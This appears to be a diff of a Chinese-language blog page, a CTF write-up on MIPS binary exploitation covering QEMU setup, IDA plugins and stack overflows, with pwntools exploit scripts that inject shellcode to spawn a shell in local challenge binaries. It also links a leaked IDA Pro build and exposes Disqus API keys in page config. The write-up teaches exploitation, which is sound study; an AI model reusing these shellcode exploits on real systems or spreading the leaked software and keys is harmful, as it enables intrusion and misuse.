@@ -273,7 +273,7 @@
 <span id="more"></span>
 <h1>1. tools</h1>
 <p>分运行环境和逆向工具两部分。Buildroot 和 gdb-multiarch，应该有手就行。这里记录的都是我出过问题的工具。</p>
-<h2 id="MIPS运行环境"><a class="header-anchor" href="#MIPS运行环境">¶</a>MIPS运行环境</h2>
+<h2 id="MIPS运行环境">MIPS运行环境</h2>
 <p>虚拟机是 x86 的平台，要运行 MIPS 指令集的程序就需要模拟运行环境。可以理解为虚拟机中的虚拟机 (?   原理是 Linux 的虚拟化技术： <a target="_blank" rel="noopener" href="https://www.redhat.com/zh/topics/virtualization/what-is-KVM">KVM是什么？一文带你快速了解Linux KVM 虚拟化 - Red Hat</a></p>
 <p>目前用的最多的虚拟器就是 QEMU 吧。它工作的原理也好理解，就是仿真，通过动态的二进制转换在 x86 架构的系统上执行其他架构的程序。说到这不得不提，这个二进制转换并不只能是复杂指令集向精简指令集的转换的，反之也行。具体例子：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1MU4y137Yi?from=search&amp;seid=13839685224042904734">给手机装Windows11！还能玩大型游戏？！_哔哩哔哩_bilibili</a> 。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install --install-suggests qemu</span><br></pre></td></tr></table></figure>
@@ -282,7 +282,7 @@
 <p>而 qemu-system 就是系统模式。模拟一个系统的运行包括镜像选择、网卡配置等用户模式设置不了的内容，它的运行相对也就多步骤些。需要目标架构的内核，模拟出目标系统后有用户名、密码，将程序上传到该系统执行、侦错就需要它能与 Linux 系统通信（也就是配置网卡、联网）… 这种情况下，异构的程序并非直接在 x86 上运行，而是在异构系统上运行，直接在 x86 上运行的是异构系统。</p>
 <img src="https://i.loli.net/2021/07/30/SYkCmUgsW3cKHVL.png"  />
 <p>讲了这么多理解的部分，是因为我觉着先理解后使用挺重要的。刚学的时候直接复制粘贴就用，不清楚工具的本质，也分不清它们的区别。（以至于国赛的时候给了个名字陌生的 qemu-user 就不会用了emmm）轩哥的文章给了很多链接，也写的很详细，看完应该差不多了：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/tools/2020/04/16/qemu/">QEMU使用记录  Clang裁缝店</a> 。</p>
-<h2 id="MIPSROP"><a class="header-anchor" href="#MIPSROP">¶</a>MIPSROP</h2>
+<h2 id="MIPSROP">MIPSROP</h2>
 <p>用的是支持 MIPS 反汇编的 IDA Pro 7.5，下载链接： <a target="_blank" rel="noopener" href="https://github.com/VanHoevenTR/IDA_Pro_7.5">VanHoevenTR/IDA_Pro_7.5: IDA Pro 7.5 leak</a> 。</p>
 <p>直接解析二进制文件的时候会报错：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...\ida\plugins\idapython3_64.dll) error: 找不到指定的模块</span><br></pre></td></tr></table></figure>
@@ -296,7 +296,7 @@ ida/<strong>plugins</strong> at master · tacnetsol/ida</a> 的 shims 插件放�
 <img src="https://i.loli.net/2021/07/30/IrMSEBxcj8O5A4f.png"  />
 <h1>2. 题目</h1>
 <p>题目来源：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题 入门 MIPS Pwn</a> 、<a target="_blank" rel="noopener" href="https://ctf.show/challenges%E3%80%82">https://ctf.show/challenges。</a></p>
-<h2 id="2-1-缓冲区溢出"><a class="header-anchor" href="#2-1-缓冲区溢出">¶</a>2.1 缓冲区溢出</h2>
+<h2 id="2-1-缓冲区溢出">2.1 缓冲区溢出</h2>
 <blockquote>
 <p>重点关注 MIPS32 与 X86 架构下 函数调用与栈的不同之处。</p>
 </blockquote>
@@ -377,7 +377,7 @@ ida/<strong>plugins</strong> at master · tacnetsol/ida</a> 的 shims 插件放�
 </ul>
 <img src="https://i.loli.net/2021/07/30/uSzx8aceYWhRL9X.png" style="zoom: 50%;" />
 <p>栈溢出漏洞的利用在叶子和非叶子函数间的主要区别就是，覆盖的是谁的返回地址。非叶子的情况和 x86 很像，比如上图的 B 函数，栈帧中存的是自己的返回地址（A），这时栈溢出能修改的就是它本身的返回地址。而像 C 这种叶子函数，本身的返回地址在 $ra 寄存器中，但payload足够长的话，能覆盖到 B 的栈帧，修改其父函数的返回地址。</p>
-<h3 id="Mplogin"><a class="header-anchor" href="#Mplogin">¶</a>Mplogin</h3>
+<h3 id="Mplogin">Mplogin</h3>
 <blockquote>
 <p>mips-32-little</p>
 </blockquote>
@@ -391,7 +391,7 @@ ida/<strong>plugins</strong> at master · tacnetsol/ida</a> 的 shims 插件放�
 <img src="https://i.loli.net/2021/07/30/9b28UBcRuDTEwXv.png"  />
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,binary=ELF(<span class="string">&#x27;./Mplogin&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./Mplogin&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process([&#x27;qemu-mipsel&#x27;, &#x27;-L&#x27;, &#x27;./&#x27;,&#x27;-g&#x27;,&#x27;2364&#x27;, &#x27;./Mplogin&#x27;])</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./Mplogin&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">name=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">name=name.ljust(<span class="number">24</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;Username :&#x27;</span>)</span><br><span class="line">sd(name)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;adminaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">stack=u32(rv(<span class="number">4</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">py=<span class="string">&#x27;access&#x27;</span></span><br><span class="line">py=py.ljust(<span class="number">20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">py+=p32(<span class="number">0x100</span>)</span><br><span class="line">ru(<span class="string">&#x27;Pre_Password :&#x27;</span>)</span><br><span class="line">sl(py)</span><br><span class="line"></span><br><span class="line">pwd=<span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">pwd=pwd.ljust(<span class="number">40</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">pwd+=p32(stack)+asm(shellcraft.sh())</span><br><span class="line">ru(<span class="string">&#x27;Password :&#x27;</span>)</span><br><span class="line">sl(pwd)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
-<h3 id="pwn"><a class="header-anchor" href="#pwn">¶</a>pwn</h3>
+<h3 id="pwn">pwn</h3>
 <blockquote>
 <p>mips-32-big</p>
 </blockquote>
@@ -419,13 +419,13 @@ ida/<strong>plugins</strong> at master · tacnetsol/ida</a> 的 shims 插件放�
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import*</span><br><span class="line">&gt;&gt;&gt; pwnlib.asm.dpkg_search_for_binutils(&#x27;mips&#x27;, &#x27;as&#x27;)</span><br><span class="line">[&#x27;binutils-mips-linux-gnu&#x27;, &#x27;binutils-mipsel-linux-gnu&#x27;]</span><br></pre></td></tr></table></figure>
 <p>原因是 ubuntu 16 自带的 binutils 版本旧，安装下对应的 gnu 就可以了。或者用 ubuntu18 以上的版本。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install binutils-mips-linux-gnu</span><br></pre></td></tr></table></figure>
-<h3 id="ctfshow-内部赛-babystack"><a class="header-anchor" href="#ctfshow-内部赛-babystack">¶</a>ctfshow 内部赛 babystack</h3>
+<h3 id="ctfshow-内部赛-babystack">ctfshow 内部赛 babystack</h3>
 <blockquote>
 <p>mips-32-little</p>
 </blockquote>
 <p>ret2shellcode：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># from struct import pack</span></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,bits=<span class="number">32</span>,endian=<span class="string">&#x27;little&#x27;</span>,binary=ELF(<span class="string">&#x27;./main&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process([&#x27;qemu-mipsel&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;-g&#x27;,&#x27;2230&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line"><span class="comment"># rop = ROP(context.binary)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">name=<span class="number">0x00410C20</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Name:&#x27;</span>)</span><br><span class="line">sl(shellcode)</span><br><span class="line">ru(<span class="string">&#x27;message:&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x34</span>+p32(name))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
-<h2 id="2-2-堆漏洞"><a class="header-anchor" href="#2-2-堆漏洞">¶</a>2.2 堆漏洞</h2>
+<h2 id="2-2-堆漏洞">2.2 堆漏洞</h2>
 
     </div>
 
@@ -485,6 +485,9 @@ ida/<strong>plugins</strong> at master · tacnetsol/ida</a> 的 shims 插件放�
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
   </div>
+  <div class="addthis_inline_share_toolbox">
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-61236172f5653199" async="async"></script>
+  </div>
 
     </div>
   </footer>
@@ -509,5 +512,5 @@ ida/<strong>plugins</strong> at master · tacnetsol/ida</a> 的 shims 插件放�
 <script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":{"Secret Key":"dtGAGQP2xwvqXmIbCUzQ9dhjU68ZeLg7MwlN44anfK85Gpsri4AiuuSZqimHKsI5","Public Key":"HAknLjMaJjEmsIxXr3Di5pv7qUaxELawBL9slYHtZV5yKUCvaZ4xLaTnNiA88LQT"},"shortname":"https-7ee1n-github-io-1","js":{"url":"https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js","integrity":"sha256-LVaMHPQ2zLqOc5rXSAfr4d1PIkEGNLyyUTDNPZmTtUw="}}</script>
 <script src="/js/third-party/comments/disqusjs.js"></script>
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
